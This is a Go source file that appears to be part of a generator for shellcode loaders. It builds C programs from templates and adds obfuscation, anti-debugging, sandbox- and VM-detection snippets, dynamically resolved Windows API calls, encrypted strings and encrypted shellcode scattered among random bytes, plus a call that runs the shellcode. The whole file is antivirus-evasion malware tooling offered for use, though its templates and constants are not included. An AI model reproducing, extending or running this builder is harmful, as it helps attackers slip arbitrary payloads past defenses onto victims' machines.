package main

import (
	"fmt"
	"regexp"
	"sort"
	"strings"

	"github.com/google/uuid"
)

type DataDefine struct {
	offset int
	value  string
	data   []byte
}

func loadCode(name string) string {
	return loadFile(fmt.Sprintf(TPL_CODE_FILE, *workingDir, name))
}

func generateCode(code string, table map[string]SnippetsMap, shell []byte) string {
	dataDefs := make(map[string]*DataDefine)
	customDefs := make(map[string]interface{})
	hasShell := len(shell) > 0

	// Fill base logic
	code = fillHeader(code, hasShell)

	// Fill named snippets first to distribute the snippets evenly
	fillCSnippets(table, true)
	code = fillSnippets(code, table, LANG_MASK_ALL, true)

	// Fill random snippets
	fillCSnippets(table, false)
	code = fillSnippets(code, table, LANG_MASK_ALL, false)

	// Fill C-snippet functions
	code = fillSnippetFuncs(code, table, LANG_C)

	// Fill API calls
	code = fillApiCalls(code, dataDefs)

	// Fill string variables
	code = fillStrings(code, dataDefs)

	// Append and encrypt data
	addPredefinedStrings(dataDefs)
	customDefs[NAME_API_KEY_SIZE] = encryptStrings(dataDefs)
	if hasShell {
		customDefs[NAME_SHELL_SIZE] = encryptShellcode(dataDefs, shell)
	}

	// Fill variables
	code = fillValues(code)
	code = fillData(code, dataDefs)
	code = fillDataDefinitions(code, dataDefs)
	code = fillCustomDefinitions(code, customDefs)

	// Fill ASM-snippet functions. Call this function last because it generates a lot of code
	code = fillSnippetFuncs(code, table, LANG_ASM)

	return code
}

func fillHeader(code string, hasShell bool) string {
	var shell string
	var shellExec string
	if hasShell {
		shell = loadCode("shell")
		shellExec = CODE_SHELL_CALL
	} else {
		shell = "/* Shellcode not provided */"
		shellExec = "/* TODO: Please provide shellcode */"
	}

	header := loadCode("header")
	r := regexp.MustCompile(`{{(api|shell)}}`)
	header = r.ReplaceAllStringFunc(header, func(str string) string {
		switch str {
		case "{{api}}":
			return loadCode("api")
		default:
			return shell
		}
	})

	r = regexp.MustCompile(`{{(header|shell-exec|caller-[0-9a-zA-Z_]*)}}`)
	return r.ReplaceAllStringFunc(code, func(str string) string {
		switch str {
		case "{{caller-init}}":
			return CODE_CALLER_INIT
		case "{{caller}}":
			return CODE_CALLER
		case "{{caller-ptr}}":
			return CODE_CALLER_PTR
		case "{{caller-var}}":
			return CODE_CALLER_VAR
		case "{{caller-var-ptr}}":
			return CODE_CALLER_VAR_PTR
		case "{{caller-cast}}":
			return CODE_CALLER_CAST
		case "{{header}}":
			return header
		case "{{shell-exec}}":
			return shellExec
		default:
			return str
		}
	})
}

func fillValues(code string) string {
	r := regexp.MustCompile(`{{value:([a-z]+)}}`)
	return r.ReplaceAllStringFunc(code, func(str string) string {
		groups := r.FindStringSubmatch(str)
		switch groups[1] {
		case "byte":
			return fmt.Sprintf("%d", randInt(256))
		case "uuid":
			return strings.Replace(uuid.NewString(), "-", "", -1)
		case "guid":
			return fmt.Sprintf("{%s}", uuid.NewString())
		default:
			return str
		}
	})
}

func fillApiCalls(code string, defs map[string]*DataDefine) string {
	r := regexp.MustCompile(`{{api-(0|n):([0-9a-zA-Z_]+)}}`)
	return r.ReplaceAllStringFunc(code, func(str string) string {
		groups := r.FindStringSubmatch(str)
		def := DataDefine{0, groups[2], nil}
		name := fmt.Sprintf(TPL_API_PROC_NAME, def.value)
		defs[name] = &def
		if def.value == VALUE_GET_PROC_ADDRESS {
			return name
		} else {
			if groups[1] == "0" {
				return fmt.Sprintf(TCP_API_CALL_0, name)
			} else {
				return fmt.Sprintf(TCP_API_CALL_N, name)
			}
		}
	})
}

func fillStrings(code string, defs map[string]*DataDefine) string {
	counter := 0
	r := regexp.MustCompile(`{{str-(alloc|realloc|free):([0-9a-zA-Z_]+)(|:(.*))}}`)
	return r.ReplaceAllStringFunc(code, func(str string) string {
		groups := r.FindStringSubmatch(str)
		call := groups[1]

		if call == "free" {
			if groups[3] == "" {
				return fmt.Sprintf(TPL_STRING_FREE, groups[2])
			}
			return str
		}

		name := groups[2]
		value := strings.ReplaceAll(strings.ReplaceAll(groups[4], "\\{", "{"), "\\}", "}")
		key := fmt.Sprintf(TPL_STRING_NAME, counter, name)
		defs[key] = &DataDefine{0, value, nil}
		counter++

		if call == "alloc" {
			return fmt.Sprintf(TPL_STRING_ALLOC, key, name)
		}
		return fmt.Sprintf(TPL_STRING_REALLOC, key, name)
	})
}

func addPredefinedStrings(defs map[string]*DataDefine) {
	defs[NAME_API_KERNEL] = &DataDefine{0, VALUE_API_KERNEL, nil}
	defs[NAME_API_GET_PROC_ADDRESS] = &DataDefine{0, VALUE_GET_PROC_ADDRESS, nil}
}

func fillData(code string, defs map[string]*DataDefine) string {
	const interval = 32

	var list []string
	for name := range defs {
		list = append(list, name)
	}

	bts := randBytes(1 + randInt(interval))
	for len(list) > 0 {
		// Randomize string offsets
		i := randInt(len(list))
		def := defs[list[i]]
		def.offset = len(bts)
		bts = append(append(bts, def.data...), randBytes(1+randInt(interval))...)
		list = remove(list, i)
	}
	bts = append(bts, randBytes(1+randInt(interval))...)

	return strings.Replace(code, "{{data}}", formatBytesToCStrings(bts), 1)
}

func fillDataDefinitions(code string, defs map[string]*DataDefine) string {
	var list []string
	for name := range defs {
		list = append(list, name)
	}
	sort.Strings(list)

	var sb strings.Builder
	for _, name := range list {
		if sb.Len() > 0 {
			sb.WriteString("\n")
		}
		sb.WriteString(fmt.Sprintf(TPL_DATA_DEFINE, name, defs[name].offset))
	}

	return strings.Replace(code, "{{data-defs}}", sb.String(), 1)
}

func fillCustomDefinitions(code string, defs map[string]interface{}) string {
	var list []string
	for name := range defs {
		list = append(list, name)
	}
	sort.Strings(list)

	var sb strings.Builder
	for _, name := range list {
		if sb.Len() > 0 {
			sb.WriteString("\n")
		}
		sb.WriteString(fmt.Sprintf(TPL_CUSTOM_DEFINE, name, defs[name]))
	}

	return strings.Replace(code, "{{custom-defs}}", sb.String(), 1)
}

func fillCSnippets(table map[string]SnippetsMap, named bool) {
	for _, snippets := range table {
		for _, snippet := range snippets {
			if snippet.template.lang != LANG_C {
				continue
			}
			for _, variant := range snippet.variants {
				variant.code = fillSnippets(variant.code, table, LANG_ASM, named)
			}
		}
	}
}

func fillSnippets(code string, table map[string]SnippetsMap, langMask Lang, named bool) string {
	var tpl string
	if named {
		tpl = `[0-9a-zA-Z_,]+`
	} else {
		tpl = `\*`
	}

	r := regexp.MustCompile(fmt.Sprintf("{{(obf|dbg|snd|vmd):(%s)}}", tpl))
	return r.ReplaceAllStringFunc(code, func(str string) string {
		groups := r.FindStringSubmatch(str)

		snippets, ok := table[groups[1]]
		if !ok {
			return str
		}

		var variant *Variant
		var snippet *Snippet

		group := groups[2]
		if group == "*" {
			variant, snippet = snippets.RandomVariant(langMask)
		} else {
			variant, snippet = snippets.OneOfVariant(strings.Split(group, ","), langMask)
		}

		if variant == nil {
			return str
		}

		return fmt.Sprintf(snippet.template.lang.CallFormat(), variant.name)
	})
}

func fillSnippetFuncs(code string, table map[string]SnippetsMap, lang Lang) string {
	var sb strings.Builder

	// Order snippets by type only
	for _, typ := range snippetTypes {
		for _, snippet := range table[typ.String()] {
			if snippet.template.lang != lang {
				continue
			}
			for _, variant := range snippet.variants {
				if variant.count == 0 {
					continue
				}
				if sb.Len() > 0 {
					sb.WriteString("\n\n")
				}
				sb.WriteString(variant.code)
			}
		}
	}

	return strings.Replace(code, lang.TemplateKey(), sb.String(), 1)
}
